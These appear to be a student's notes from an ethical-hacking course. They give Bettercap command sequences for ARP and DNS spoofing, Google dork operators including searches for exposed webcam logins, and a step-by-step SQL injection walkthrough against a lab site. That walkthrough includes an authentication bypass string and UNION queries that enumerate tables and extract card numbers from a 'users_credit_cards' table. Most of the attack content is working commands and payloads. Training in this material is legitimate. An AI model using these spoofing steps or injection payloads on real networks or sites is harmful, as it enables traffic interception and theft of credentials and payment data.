ifconfig to find the IP address of the network

Searching IP- netdiscovery(netdiscovery -r (IP.1/24)) or zenmap

arp -a = Gives the IP address and MAC address for the same

Why ARP(Address Resolution Protocol) spoofing takes place? = 1) Clients accept response without request
								                             2) Client trust response without verification

ARP spoofing is done using "Bettercap"


Steps-
bettercap -iface eth0
net.probe on
net.show
help arp.spoof
set arp.spoof.fullduplex true
set apr.spoof.targets 192.168.253.132
arp.spoof on
net.sniff on

For running a set of code bettercap -iface eth0 -caplet filename.cap 
And convert it to a caplet by syntax FILE_NAME.cap 

DNS spoofing /var/www/html -----> index.htmlfile displayed when IP is typed in the browser.

dns.spoof.address redirects to a particular site.
steps:
set dns.spoof.all true
set dns.spoof.domains DOMAIN_NAME1,DOMAIN_NAME2,.......(*.DOMAIN_NAME - targets all the sites of a domain)
dns.spoof on

Wireshark is not a hacking tool but we can see the data transferred.

Whois website for Info of the Website
webarchive.org old snapshots
site:site name , gives specific
1. site: <Domain> 

This is the most common dork, and it filters out web pages from a single website.

Eg:  “site:internshala.com” lists out all the web pages on internshala. 

It can also be used to search for web pages within a specific sub domain, or even for an entire TLD. 

So you can search for “site:trainings.internshala.com” to search for a specific sub domain or for “site:in” to search for all the web pages with the top lovel domain (TLD) ".in" in them.

2. inurl: <Text to find>

This keyword can be used to find URLs with specific text in them. 

So if you search for “inurl: login.html” it will give a list of all URLs where the text login.html is present. 

3. intitle: <Title text>

This dork can be used to search for web pages which have some specific keyword in the web page title. 

For example, “intitle: admin login” gives a list of several admin panels. 

4. intext : <Text>

This dork can be used to search for specific keywords in the body of the web page. 

So if you type “intext: webcam login” it returns a lot of interesting results, some of which look like login pages of live webcams across the globe. Some have weak passwords, or no passwords at all, which makes them vulnerable to attack. 

5. filetype: <Type>

This is the most useful dork, and can be used to filter out web pages which have a particular type. This dork can be used to search for  documents (pdf), spreadsheets (xls), webpages (html), server pages (php), executables (exe), presentations (ppt) and much more.

A lot of students use it to quickly find pdfs related to the assignments that they are supposed to make. For example, if you do a search for “Revolt of 1857 filetype: pdf” you get a result of all pdfs on the topic. 

6. ext: <File extension>

This is similar to the “filetype: <Type>” dork, and can be used to search for specific or uncommon file extensions.

Eg: “ext: config” returns a list of all configurations which have the name “filename.config”

7. “Exact word”

We have already learnt how to use this dork in the previous topic. 

When we search for a keyword without putting double quotes, the result includes pages which have the exact word, or synonyms, or other related material. But, when we do a search using double quotation marks, the search is more specific, and returns only those web pages which actually contain the keyword as it is. 

8. Negative search - (minus)

This search is used to eliminate certain types from the main search. 

For example, you want to find out platforms that have the beginners guide to C++. But, you want a free version of the book, and not a paid one. 

So you can simple search for “Beginner's guide to C++ -buy -order -purchase -pay” to get results of free books. 

9. “Keyword 1” | “Keyword 2”

This search can be used to put an OR between keywords, which are in double quotes. 

Eg: “admin login” | “administrator login”

For SQL injection USN-x PWD-y 'or'a'='a'

keep putting ORDER BY 'n'

steps
Step2: Enter the query given below in the URL:
http://13.232.78.80/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-3/details.php?dept_id=1) or (1)=(1
Now press enter. It will provide information for all the departments.
Step3: To find the vulnerable columns use the following commands:
http://13.232.78.80/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-3/details.php?dept_id=1) order by (4
http://13.232.78.80/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-3/details.php?dept_id=-1) UNION SELECT (1),(2),(3),(4
Step4: To find the table schema, use the following command:
http://13.232.78.80/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-3/details.php?dept_id=-1) UNION SELECT (1),(database()),(3),(4
output:
Department of Faculty:
SQL_Injection_V5, 3
Step5: Now for finding tables, copy this in the browser:
http://13.233.164.59/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-3/details.php?dept_id=1) union select 1,database(),table_name,4 from information_schema.tables where table_schema='SQL_Injection_V5'--+
Step6: To find the column names use the following command:
http://13.232.218.95/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-3/details.php?dept_id=1) union select 1,database(),column_name,4 from information_schema.columns where table_schema='SQL_Injection_V5' and table_name='users_credit_cards'--+
Step7: To extract the data use the following command:
http://13.232.218.95/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-3/details.php?dept_id=1) union select 1,id,card_number,4 from users_credit_cards--+
(You will have to customaize it for the IP address you have in your URL)
